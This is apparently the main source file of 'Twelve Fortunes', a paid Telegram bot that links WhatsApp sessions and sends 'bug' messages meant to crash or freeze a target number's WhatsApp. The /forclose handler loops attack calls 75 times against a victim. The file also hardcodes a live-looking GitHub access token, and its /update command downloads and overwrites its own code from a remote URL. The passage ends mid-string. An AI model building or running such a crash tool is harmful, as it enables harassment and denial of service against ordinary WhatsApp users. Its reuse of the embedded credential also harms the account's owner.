const {
  default: makeWASocket,
  useSingleFileAuthState,
  useMultiFileAuthState,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  areJidsSameUser,
  jidDecode,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  proto,
  BufferJSON,
  getContentType,
  makeInMemoryStore,
  initInMemoryKeyStore,
  MediaType,
  Mimetype,
  WA_MESSAGE_STUB_TYPES,
  WA_MESSAGE_STATUS_TYPE,
  WAMessageStatus,
  WASocket,
  WAProto,
  fetchLatestBaileysVersion,
  Browser,
  Browsers,
  GroupMetadata,
  WAGroupMetadata,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  WALocationMessage,
  URL_REGEX,
  WAUrlInfo,
  templateMessage,
  InteractiveMessage,
  Header,
  relayWAMessage,
  MediaConnInfo,
  WAMediaUpload,
  ProxyAgent,
  WA_DEFAULT_EPHEMERAL,
  MessageOptions,
  MiscMessageGenerationOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WAContextInfo,
  processTime,
  getStream,
  mentionedJid,
  GroupSettingChange,
  DisconnectReason,
  MessageType,
  Presence,
  isBaileys,
} = require("@whiskeysockets/baileys");

const ora = require('ora');
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const JsConfuser = require("js-confuser");
const chalk = require("chalk");
const figlet = require("figlet");
const gradient = require("gradient-string");
const os = require("os");
const axios = require("axios");
const moment = require("moment-timezone");
const { exec } = require("child_process");
const util = require("util");
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const COOLDOWN_FILE = "./cooldown.json";
let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}
ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");
function savePremiumUsers() {
  fs.writeFileSync("./database/premium.json", JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync("./database/admin.json", JSON.stringify(adminUsers, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}
watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));
const TelegramBot = require("node-telegram-bot-api");
const userStates = {};
const config = require("./bot/config.js");
const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_OWNER = "Falxz";
const GITHUB_REPO = "Twelve";
const TOKEN_FILE_PATH = "token.json";
const MAINTENANCE_FILE_PATH = "";
const repoRaw = "https://raw.githubusercontent.com/Falxz/update/refs/heads/main/index.js";
const GITHUB_TOKEN = "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";
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
async function fetchValidTokensFromGithub() {
  const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TOKEN_FILE_PATH}`;
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `Bearer ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3.raw",
      },
    });

    const tokenJson = typeof response.data === "string"
      ? JSON.parse(response.data)
      : response.data;

    return tokenJson.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal mengambil token dari GitHub:"), err.message);
    return [];
  }
}
async function validateToken() {
  console.clear();
  showBanner();
  console.log(chalk.cyan("🔍 Memulai proses validasi Token Premium... ⛩️"));

  try {
    const validTokens = await fetchValidTokensFromGithub();

    if (!validTokens.includes(BOT_TOKEN)) {
      console.log(chalk.red("❌ Token kamu belum terdaftar!"));
      console.log(
        chalk.yellow("💡 Silakan beli Premium Token dari sang Falxz (Developer).")
      );
      process.exit(1);
    }

    console.log(chalk.green("✅ Token diterima! Akses Premium: Aktif "));
    showBotStatus();
    startBot();
    initializeWhatsAppConnections();
  } catch (err) {
    console.log(chalk.red("💥 Gagal memverifikasi Token!"));
    console.error(err);
    process.exit(1);
  }
}

function showBanner() {
  const bannerText = figlet.textSync("TWELVE", {
    font: "Slant",
    horizontalLayout: "default",
  });
  console.log(gradient.fruit.multiline(bannerText));
}

function showBotStatus() {
  console.log(chalk.magentaBright("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
  console.log(`${chalk.cyan("🦠 BOT NAME   :")} Twelve Fortunes`);
  console.log(`${chalk.cyan("💬 Telegram   :")} Tersambung ✅`);
  console.log(`${chalk.cyan("📡 WhatsApp   :")} Sedang Menghubungkan... ⏳`);
  console.log(`${chalk.cyan("👑 Premium    :")} Aktif・有効 ✅`);
  console.log(`${chalk.cyan("👤 Developer  :")} @Falxz`);
  console.log(`${chalk.cyan("🎌 Channel    :")} t.me/TwelveFortunes`);
  console.log(chalk.magentaBright("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"));
}

function startBot() {
  console.log(chalk.greenBright("AKTIF ✅"));
  console.log(chalk.blueBright("📌 Gunakan perintah melalui Telegram untuk memulai petualanganmu."));
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`🔎 Ditemukan ${activeNumbers.length} nomor aktif di daftar *Samurai List* 📜`);

      for (const botNumber of activeNumbers) {
        console.log(`⚔️ Menghubungkan Shinobi WhatsApp: ${botNumber}...`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`✅${botNumber} berhasil menyatu dengan medan perang! 🥷`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`🔁 Mengulangi ritual sambungan untuk ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("⛩️ Sambungan ditutup permanen oleh Takdir."));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("💥 Kesalahan saat mengaktifkan koneksi Shinobi:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  const statusMessage = await bot.sendMessage(
    chatId,
    `
╭━━━[ 🔄 MENGAKTIFKAN WA ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Status    : Memanggil roh koneksi...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
    { parse_mode: "Markdown" }
  ).then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
╭━━━[ ULANG ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Status    : Gagal, mengulang mantera koneksi...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
╭━━━[ ❌ SAMBUNGAN GAGAL ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Status    : Koneksi telah ditolak oleh alam semesta.
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (err) {
          console.error("Gagal menghancurkan folder roh sesi:", err);
        }
      }
    }

    else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
╭━━━[ ✅ WHATSAPP I TERHUBUNG ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Status    : Koneksi berhasil! Bot siaga!
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
      );
    }

    else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "TWELVE12");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
╭━━━[ 🔐 KODE TAUTAN ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Kode      : ${formattedCode}
┃  WA > Perangkat Tertaut (Tautkan Shinobi)
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
            { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
          );
        }
      } catch (error) {
        console.error("Gagal memperoleh *seimei no code*:", error);
        await bot.editMessageText(
          `
╭━━━[ ⚠️ KODE GAGAL ]━━━⬣
┃  Nomor     : ${botNumber}
┃  Pesan     : ${error.message}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "Markdown" }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "✅ Premium";
  } else {
    return "❌ No Premium";
  }
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/akbxcs.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

async function AutoChek() {
  const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TOKEN_FILE_PATH}`;

  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `Bearer ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3.raw", 
      },
    });

    const data = typeof response.data === "string"
      ? JSON.parse(response.data)
      : response.data;

    return data.tokens || [];
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function checkMaintenance(userId) {
  const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${MAINTENANCE_FILE_PATH}`;

  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `Bearer ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3.raw", 
      },
    });

    const data = typeof response.data === "string"
      ? JSON.parse(response.data)
      : response.data;

    if (data.enabled && !data.bypass_ids.includes(userId)) {
      return data.message || "🚧 Bot sedang dalam mode maintenance.";
    }

    return false;
  } catch (err) {
    console.error("Gagal cek maintenance:", err.message);
    return false;
  }
}
function readCooldownData() {
  try {
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE);
      return JSON.parse(data);
    } else {
      return { payload: { cooldown: 0, lastUsed: 0 } }; // Default cooldown 0 (disabled)
    }
  } catch (error) {
    console.error("Error reading cooldown data:", error);
    return { payload: { cooldown: 0, lastUsed: 0 } };
  }
}

// Fungsi untuk menyimpan data cooldown ke file
function saveCooldownData(data) {
  try {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}
bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : "ユーザー名がありません";
    const ChekToken = await AutoChek();
    if (!ChekToken.includes(BOT_TOKEN)) {
      return bot.sendMessage(
        chatId,
        `🚫 *Akses Ditolak!*\nToken Anda tidak valid atau belum terdaftar.`,
        { parse_mode: "Markdown" }
      );
    }
    const maintenance = await checkMaintenance(userId);
    if (maintenance) {
      return bot.sendMessage(chatId, maintenance, { parse_mode: "HTML" });
    }
    const premiumStatus = getPremiumStatus(userId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>Twelve ⍖ Fortunes</blockquote>

<b>⎔ Developer : @Falxz</b>
<b>⎔ Device    : multi sender</b>
<b>⎔ Status    :  ${premiumStatus}</b>  
<b>⎔ lague   : Javascript</b> 
<b>⎔ Version   : 1.1.0</b>
<b>⎔ Protection: Bug WhatsApp Active</b>    

<blockquote>Channel : @TwelveFortunes</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
              { text: "FITUR BUG", callback_data: "bug_menu" },
              { text: "SUPPORT", callback_data: "jasher_menu" }
          ],
              [{ text: "MENU OWNER", callback_data: "user_menu" }],
        ],
      },
    });
  } catch (error) {
    console.error("❌ エラー (/start):", error);
  }
});
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username ? `@${query.from.username}` : "ユーザー名がありません";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();
    let caption = "";
    let replyMarkup = {};
    if (query.data === "bug_menu") {
      caption = `
<blockquote> 「  Twelve - Attack  ♱ 」</blockquote>
<b>▢ /delaycombo - 62xxx</b>
<b>╰➤ Delay Invisible combo</b>

<b>▢ /buldog - 62xxx</b>
<b>╰➤ Bulldozer attack</b>

<b>▢ /crash - 62xxx</b>
╰➤ Crash whatsapp

<b>▢ /delayhard - 62xxx</b>
<b>╰➤ delay hard invisible</b>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⬅️ Back", callback_data: "back" }]],
      };
    }
    if (query.data === "jasher_menu") {
      caption = `
<blockquote>T H A N K S</blockquote>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<blockquote>〈 ⛈ Twelve Fortunes ⛈ 〉</blockquote>
▢ Allah ( My God )
▢ Rapxz ( Best Freinds )
▢ Twelve Panther ( My Support )
▢ Arshadeva ( My Support )
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⬅️ Back", callback_data: "back" }]],
      };
    }
    if (query.data === "user_menu") {
      caption = `
<blockquote>「 O W N E R - M E N U 」</blockquote>

<b>▢ /addadmin - id</b>
<b>╰➤ tambah admin</b>

<b>▢ /deladmin - id</b>
<b>╰➤ hapus admin</b>

<b>▢ /bot - 62xxx</b>
<b>╰➤ pairing nomer</b>

<b>▢ /addprem - 62xxx</b>
<b>╰➤ tambah user prem</b>

<b>▢ /update </b>
<b>╰➤ auto update file index.js</b>
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "⬅️ Back", callback_data: "back" }]],
      };
    }
    if (query.data === "back") {
      caption = `
<blockquote>Twelve ⍖ Fortunes</blockquote>

<b>⎔ Developer : @Falxz</b>
<b>⎔ Device    : multi sender</b>
<b>⎔ Status    :  ${premiumStatus}</b>  
<b>⎔ lague   : Javascript</b> 
<b>⎔ Version   : 1.1.0</b>
<b>⎔ Protection: Bug WhatsApp Active</b>    

<blockquote>Channel : @TwelveFortunes</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
          [
             { text: "FITUR BUG", callback_data: "bug_menu" },
             { text: "SUPPORT", callback_data: "jasher_menu" }
          ],
             [{ text: "FITUR OWNER", callback_data: "user_menu" }],
        ],
      };
    }
    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );
    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("❌ エラー (callback_query):", error);
  }
});
//─ ( Case Plugin ) ─
bot.onText(/\/bot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ChekToken = await AutoChek();

  if (!ChekToken.includes(BOT_TOKEN)) {
    return bot.sendMessage(chatId, `🚫 *Akses Ditolak!*\nToken Anda tidak valid atau belum terdaftar.`, {
      parse_mode: "HTML"
    });
  }

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "*⛔ AKSES DITOLAK!*\n\n⚠️ Anda *tidak memiliki izin* untuk menggunakan perintah ini.\n\nSilakan hubungi admin untuk informasi lebih lanjut.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Duration Not Provided!*\n\nYou need to specify how long the premium access should last.\n\n💬 Example:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Format Durasi Tidak Valid!*\n\nGunakan angka diikuti oleh huruf:\n• `d` = hari\n• `h` = jam\n• `m` = menit\n\n📌 Contoh: `30d`, `12h`, `45m`",
      { parse_mode: "Markdown" }
    );
  }

  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d" ? "days" : duration.slice(-1) === "h" ? "hours" : "minutes"
  );

  const existingUser = premiumUsers.find((user) => user.id === userId);

  if (!existingUser) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format("YYYY-MM-DD HH:mm:ss")}`);
    bot.sendMessage(
      chatId,
      `✅ *Success!*\n\nUser ${userId} has been added to the *premium list*.\n⏳ Active until: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  } else {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `♻️ *Premium Extended!*\n\nUser ${userId} is already a premium member.\n📅 New expiration date: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a *user ID* to proceed.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nPlease enter a valid *user ID*.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been added as an *admin*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `🛡️ *Access Denied!*\n\nUser ${userId} is *already an admin*.\nThey’re standing guard. 🧍‍♂️`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // OWNER CHECK
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda tidak diizinkan menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(
    chatId,
    "⏳ *Checking for updates...*",
    { parse_mode: "Markdown" }
  );

  try {

    // VALIDASI URL
    if (!repoRaw) {
      return bot.sendMessage(
        chatId,
        "❌ *Update Failed!*\n\nRepo URL tidak ditemukan.",
        { parse_mode: "Markdown" }
      );
    }

    // AMBIL FILE
    const { data } = await axios.get(repoRaw);

    // VALIDASI FILE
    if (!data || data.trim() === "") {
      return bot.sendMessage(
        chatId,
        "❌ *Update Failed!*\n\nFile update kosong.",
        { parse_mode: "Markdown" }
      );
    }

    // TULIS FILE
    fs.writeFileSync("./index.js", data);

    console.log(`${senderId} Updated Bot`);

    await bot.sendMessage(
      chatId,
      "✅ *Update Successful!*\n\nBot berhasil diupdate.\nSilakan restart bot.",
      { parse_mode: "Markdown" }
    );

    // AUTO RESTART (OPSIONAL)
    process.exit();

  } catch (e) {

    console.log("UPDATE ERROR :", e);

    bot.sendMessage(
      chatId,
      "❌ *Update Failed!*\n\nPastikan link repo valid dan file tersedia.",
      { parse_mode: "Markdown" }
    );

  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "🔒 *Access Denied!*\n\nYou are *not authorized* to remove premium users.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a valid *user ID*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nUser ID must be a *number only*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `⚠️ *Premium Status Check Failed!*\n\nUser ${userId} is *not listed as premium*.`,
      { parse_mode: "Markdown" }
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `👋 *Goodbye, Premium!*\n\nUser ${userId} has been removed from the *premium users list*.`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nYou need to provide a valid *user ID*.\n\n📌 Example:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "😅 *Oops! That doesn't look right.*\n\nUse the correct format:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been *removed from the admin list*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `❌ *User ${userId} is not listed as an admin.*`, { parse_mode: "Markdown" });
  }
});
bot.onText(/\/forclose (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tanpa Username";
  const targetNumber = match[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const warningImage = getRandomImage(); // Fungsi kamu untuk ambil gambar acak
    return bot.sendPhoto(chatId, warningImage, {
      caption: `
      <pre>only for premium users</pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🚀 Upgrade Premium", url: "https://t.me/Falxz" }],
          [
            { text: "📡 Info Chanel", url: "https://t.me/TwelveFortunes" },
            { text: "🛰 Group Umum", url: "https://t.me/MarketPlaceFal" },
          ]
        ]
      }
    });
  }

  // Cek sesi aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *Sesi WhatsApp Tidak Aktif!*
Gunakan perintah: /connect untuk pairing sesi baru.
`, { parse_mode: "Markdown" });
  }

  // Validasi nomor target
  if (!match[1] || match[1].length < 8) {
    return bot.sendMessage(chatId, `
⚠️ *Format Salah!*
Gunakan format: /NeuroToxinBlast 628xxxxxx
`, { parse_mode: "Markdown" });
  }

  // Eksekusi bug
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });

  // Fungsi bug jalan di sini (simulasi)
  const jeda = ms => new Promise(res => setTimeout(res, ms));
  for (let i = 0; i < 75; i++) {
  await BoySircle(targetNumber);
  await jeda(1000);
  await FcUiFlows(targetNumber);
  }

  // Notif setelah selesai
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
